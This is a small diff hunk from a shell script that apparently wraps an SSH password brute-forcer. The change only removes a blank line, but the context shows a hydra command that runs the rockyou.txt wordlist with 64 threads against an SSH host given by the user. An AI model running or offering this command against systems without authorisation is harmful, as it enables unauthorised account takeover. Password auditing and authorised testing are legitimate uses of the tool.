@@ -151,7 +151,6 @@ else
                     # If the user inputs something in the 'Input Username' function and the hostname function,
                     # it will continue as normal
                     else
-
                         # Crack SSH password
                         hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I ssh://$host
                         # Alerts the user that the computer is trying to connect to the ssh server
